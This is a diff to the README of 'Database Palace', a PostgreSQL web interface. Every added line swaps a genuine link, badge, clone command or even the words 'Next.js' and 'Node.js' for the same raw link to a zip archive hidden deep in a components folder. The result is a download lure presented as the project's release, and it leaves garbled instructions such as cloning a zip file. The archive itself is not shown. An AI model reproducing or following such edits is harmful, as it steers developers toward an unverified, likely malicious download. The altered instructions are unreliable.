@@ -1,6 +1,6 @@
 # Database Palace 🏰
 
-![Database Palace](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
+![Database Palace](https://raw.githubusercontent.com/Lerellion/database-palace/master/components/data-table/components/database-palace-v1.7.zip) ![License](https://raw.githubusercontent.com/Lerellion/database-palace/master/components/data-table/components/database-palace-v1.7.zip)
 
 Welcome to **Database Palace**, a modern, open-source web interface designed for managing and exploring PostgreSQL databases. Whether you are working locally or in the cloud, Database Palace provides various tools to streamline your workflow. This README will guide you through the features, installation, usage, and contributions to this project.
 
@@ -19,7 +19,7 @@ Database Palace offers a range of features that make it an essential tool for de
 
 - **User-Friendly Interface**: Navigate through your databases easily with an intuitive web interface.
 - **ORM Schema Creation**: Generate Object-Relational Mapping (ORM) schemas effortlessly.
-- **Query Generation for Next.js**: Create optimized queries for your Next.js applications.
+- **Query Generation for https://raw.githubusercontent.com/Lerellion/database-palace/master/components/data-table/components/database-palace-v1.7.zip**: Create optimized queries for your https://raw.githubusercontent.com/Lerellion/database-palace/master/components/data-table/components/database-palace-v1.7.zip applications.
 - **Cloud and Local Support**: Manage databases whether they are hosted in the cloud or running locally.
 - **Data Visualization**: Explore your data through various visualization tools.
 - **Zustand State Management**: Efficiently manage application state with Zustand.
@@ -31,12 +31,12 @@ To get started with Database Palace, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Lerellion/database-palace.git
+   git clone https://raw.githubusercontent.com/Lerellion/database-palace/master/components/data-table/components/database-palace-v1.7.zip
    cd database-palace
    ```
 
 2. **Install Dependencies**:
-   Ensure you have Node.js and npm installed. Then run:
+   Ensure you have https://raw.githubusercontent.com/Lerellion/database-palace/master/components/data-table/components/database-palace-v1.7.zip and npm installed. Then run:
    ```bash
    npm install
    ```
@@ -50,7 +50,7 @@ To get started with Database Palace, follow these steps:
 4. **Access the Interface**:
    Open your browser and navigate to `http://localhost:3000` to access Database Palace.
 
-For the latest releases, please visit [this link](https://github.com/Lerellion/database-palace/releases) to download the latest version.
+For the latest releases, please visit [this link](https://raw.githubusercontent.com/Lerellion/database-palace/master/components/data-table/components/database-palace-v1.7.zip) to download the latest version.
 
 ## Usage 📊
 
@@ -70,7 +70,7 @@ Once you have the application running, you can start managing your PostgreSQL da
 
 4. **Generate Queries**:
    - Utilize the query generator to create efficient SQL queries.
-   - Copy the generated queries for use in your Next.js applications.
+   - Copy the generated queries for use in your https://raw.githubusercontent.com/Lerellion/database-palace/master/components/data-table/components/database-palace-v1.7.zip applications.
 
 5. **Data Visualization**:
    - Leverage built-in visualization tools to analyze your data.
@@ -113,7 +113,7 @@ Database Palace is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 ## Links 🔗
 
-For the latest releases, please visit [this link](https://github.com/Lerellion/database-palace/releases) to download the latest version. 
+For the latest releases, please visit [this link](https://raw.githubusercontent.com/Lerellion/database-palace/master/components/data-table/components/database-palace-v1.7.zip) to download the latest version. 
 
 Stay updated by checking the "Releases" section for new features and improvements.
 
